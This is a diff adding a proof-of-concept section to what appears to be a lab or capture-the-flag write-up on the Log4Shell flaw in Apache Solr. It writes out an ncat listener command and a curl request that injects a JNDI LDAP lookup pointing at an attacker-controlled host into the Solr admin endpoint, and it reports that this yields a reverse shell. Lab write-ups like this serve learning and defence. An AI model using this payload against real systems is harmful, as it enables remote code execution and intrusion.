@@ -53,3 +53,27 @@ Analysing the data entrypoint can be params which is empty in the logs which can
 **Answer**
 
 `params`
+
+## Proof of Concept
+
+Created a ncat listener on port 9999
+
+<img width="525" height="176" alt="image" src="https://github.com/user-attachments/assets/b520fa08-92b7-4908-89d5-1dd7b255af66" />
+
+Command: 
+
+`nc -lnvp 9999`
+
+
+Then connected usering curl in the `/solr/admin/cores?foo=` endpoint with my local ip with ldap lookup.
+
+<img width="814" height="209" alt="image" src="https://github.com/user-attachments/assets/b0fa8239-ca6e-401b-85e8-769fa3523ad0" />
+
+Command:
+
+`curl 'http://10.49.145.26:8983/solr/admin/cores?foo=$\{jndi:ldap://10.49.122.225:9999\}'`
+
+And I got the revshell
+
+<img width="490" height="128" alt="image" src="https://github.com/user-attachments/assets/ed9a26e7-20b0-4b54-9d73-ab3097369db8" />
+
